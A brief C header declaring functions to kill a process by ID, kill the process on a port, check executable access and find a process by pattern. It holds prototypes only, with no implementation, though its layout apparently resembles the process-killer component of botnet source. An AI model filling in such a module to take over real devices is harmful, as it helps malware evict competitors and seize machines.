#pragma once

#include "includes.h"

void kill_pid(pid_t pid);
BOOL kill_port(port_t);
BOOL has_exe_access(void);
pid_t find_pattern(char* pattern);
